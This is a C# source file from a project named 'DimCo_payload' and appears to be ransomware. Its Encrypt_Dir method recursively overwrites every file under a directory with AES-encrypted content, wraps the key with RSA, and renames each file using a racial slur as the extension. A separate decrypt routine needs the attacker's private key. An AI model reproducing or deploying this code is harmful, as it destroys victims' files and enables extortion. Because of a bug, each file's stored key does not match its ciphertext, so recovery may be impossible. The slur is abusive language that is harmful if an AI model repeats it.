using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace DimCo_payload.Encryption;

public class Encryption
{
	public static class RSA
	{
		[Serializable]
		public class EncryptorRSAKeys
		{
			public string PublicKey { get; set; }

			public string PrivateKey { get; set; }
		}

		private static bool _optimalAsymmetricEncryptionPadding;

		public static EncryptorRSAKeys GenerateKeys(int keySize)
		{
			if (keySize % 2 == 0 && keySize >= 512)
			{
				EncryptorRSAKeys encryptorRSAKeys = new EncryptorRSAKeys();
				using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(keySize);
				string publicKey = rSACryptoServiceProvider.ToXmlString(includePrivateParameters: false);
				string publicKey2 = rSACryptoServiceProvider.ToXmlString(includePrivateParameters: true);
				string publicKey3 = IncludeKeyInEncryptionString(publicKey, keySize);
				string privateKey = IncludeKeyInEncryptionString(publicKey2, keySize);
				encryptorRSAKeys.PublicKey = publicKey3;
				encryptorRSAKeys.PrivateKey = privateKey;
				return encryptorRSAKeys;
			}
			throw new Exception("Key should be multiple of two and greater than 512.");
		}

		public static string EncryptText(string text, string publicKey)
		{
			int keySize = 0;
			string xmlKey = "";
			GetKeyFromEncryptionString(publicKey, out keySize, out xmlKey);
			return Convert.ToBase64String(Encrypt(Encoding.UTF8.GetBytes(text), keySize, xmlKey));
		}

		public static byte[] EncryptBytes(byte[] bytes, string publicKey)
		{
			int keySize = 0;
			string xmlKey = "";
			GetKeyFromEncryptionString(publicKey, out keySize, out xmlKey);
			return Encrypt(bytes, keySize, xmlKey);
		}

		public static byte[] DecryptBytes(byte[] bytes, string publicKey)
		{
			int keySize = 0;
			string xmlKey = "";
			GetKeyFromEncryptionString(publicKey, out keySize, out xmlKey);
			return Decrypt(bytes, keySize, xmlKey);
		}

		public static byte[] Encrypt(byte[] data, int keySize, string publicKeyXml)
		{
			if (data != null && data.Length != 0)
			{
				int maxDataLength = GetMaxDataLength(keySize);
				if (data.Length > maxDataLength)
				{
					throw new ArgumentException($"Maximum data length is {maxDataLength}", "data");
				}
				if (!IsKeySizeValid(keySize))
				{
					throw new ArgumentException("Key size is not valid", "keySize");
				}
				if (string.IsNullOrEmpty(publicKeyXml))
				{
					throw new ArgumentException("Key is null or empty", "publicKeyXml");
				}
				using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(keySize);
				rSACryptoServiceProvider.FromXmlString(publicKeyXml);
				return rSACryptoServiceProvider.Encrypt(data, _optimalAsymmetricEncryptionPadding);
			}
			throw new ArgumentException("Data are empty", "data");
		}

		public static string DecryptText(string text, string privateKey)
		{
			int keySize = 0;
			string xmlKey = "";
			GetKeyFromEncryptionString(privateKey, out keySize, out xmlKey);
			byte[] bytes = Decrypt(Convert.FromBase64String(text), keySize, xmlKey);
			return Encoding.UTF8.GetString(bytes);
		}

		public static byte[] Decrypt(byte[] data, int keySize, string publicAndPrivateKeyXml)
		{
			if (data != null && data.Length != 0)
			{
				if (!IsKeySizeValid(keySize))
				{
					throw new ArgumentException("Key size is not valid", "keySize");
				}
				if (string.IsNullOrEmpty(publicAndPrivateKeyXml))
				{
					throw new ArgumentException("Key is null or empty", "publicAndPrivateKeyXml");
				}
				using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(keySize);
				rSACryptoServiceProvider.FromXmlString(publicAndPrivateKeyXml);
				return rSACryptoServiceProvider.Decrypt(data, _optimalAsymmetricEncryptionPadding);
			}
			throw new ArgumentException("Data are empty", "data");
		}

		public static int GetMaxDataLength(int keySize)
		{
			if (_optimalAsymmetricEncryptionPadding)
			{
				return (keySize - 384) / 8 + 7;
			}
			return (keySize - 384) / 8 + 37;
		}

		public static bool IsKeySizeValid(int keySize)
		{
			if (keySize >= 384 && keySize <= 16384)
			{
				return keySize % 8 == 0;
			}
			return false;
		}

		private static string IncludeKeyInEncryptionString(string publicKey, int keySize)
		{
			return Convert.ToBase64String(Encoding.UTF8.GetBytes(keySize + "!" + publicKey));
		}

		private static void GetKeyFromEncryptionString(string rawkey, out int keySize, out string xmlKey)
		{
			keySize = 0;
			xmlKey = "";
			if (rawkey == null || rawkey.Length <= 0)
			{
				return;
			}
			byte[] bytes = Convert.FromBase64String(rawkey);
			string @string = Encoding.UTF8.GetString(bytes);
			if (@string.Contains("!"))
			{
				string[] array = @string.Split(new char[1] { '!' }, 2);
				try
				{
					keySize = int.Parse(array[0]);
					xmlKey = array[1];
				}
				catch
				{
				}
			}
		}
	}

	public class AES
	{
		public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
		{
			byte[] array = null;
			byte[] salt = new byte[8] { 5, 6, 2, 7, 9, 212, 34, 53 };
			using MemoryStream memoryStream = new MemoryStream();
			using RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Mode = CipherMode.CBC;
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
				cryptoStream.Close();
			}
			return memoryStream.ToArray();
		}

		public static byte[] AES_Decrypt(byte[] bytesToBeDecrypted, byte[] passwordBytes)
		{
			byte[] array = null;
			byte[] salt = new byte[8] { 5, 6, 2, 7, 9, 212, 34, 53 };
			using MemoryStream memoryStream = new MemoryStream();
			using RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Mode = CipherMode.CBC;
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
				cryptoStream.Close();
			}
			return memoryStream.ToArray();
		}
	}

	private static Random RNG = new Random();

	public int A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A()
	{
		new List<string>().Add("This encryption library/wrapper was taken from github");
		return 0;
	}

	public static byte[] Generate_AES_Key()
	{
		byte[] array = new byte[32];
		new RNGCryptoServiceProvider().GetBytes(array);
		return array;
	}

	public static byte[] Decrypt_File_AESRSA(Tuple<byte[], byte[]> encoded, string RSA_Private_Key)
	{
		byte[] passwordBytes = RSA.DecryptBytes(encoded.Item2, RSA_Private_Key);
		return AES.AES_Decrypt(encoded.Item1, passwordBytes);
	}

	public static string RandomString(int minlen, int maxlen)
	{
		int num = RNG.Next(minlen, maxlen);
		string text = "";
		string text2 = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
		for (int i = 0; i < num; i++)
		{
			text += text2.ToCharArray()[RNG.Next(text2.Length - 1)];
		}
		return text;
	}

	public static string Base64Encode(byte[] plainText)
	{
		return Convert.ToBase64String(plainText);
	}

	public static void Encrypt_Dir(string dir, string RSA_Public_Key)
	{
		foreach (string item in Directory.EnumerateFiles(dir))
		{
			try
			{
				if (!item.EndsWith(".#01q354d98o") && !item.EndsWith(".#01q354d98o"))
				{
					string contents = Base64Encode(Encrypt_File_AESRSA(File.ReadAllBytes(item), RSA_Public_Key, Generate_AES_Key()).Item1) + "@" + Base64Encode(Encrypt_File_AESRSA(File.ReadAllBytes(item), RSA_Public_Key, Generate_AES_Key()).Item2);
					File.WriteAllText(item, contents);
					File.Move(item, item + ".nigger");
					Console.WriteLine(item + " Encrypted.");
				}
			}
			catch (Exception ex)
			{
				Console.WriteLine("Couldn't encrypt " + item + " " + ex.Message);
			}
		}
		foreach (string item2 in Directory.EnumerateDirectories(dir))
		{
			try
			{
				if (!item2.ToLower().Contains("appdata"))
				{
					Encrypt_Dir(item2, RSA_Public_Key);
				}
			}
			catch
			{
			}
		}
	}

	public static Tuple<byte[], byte[]> Encrypt_File_AESRSA(byte[] File, string RSA_Public_Key, byte[] AES)
	{
		return new Tuple<byte[], byte[]>(Encryption.AES.AES_Encrypt(File, AES), RSA.EncryptBytes(AES, RSA_Public_Key));
	}
}
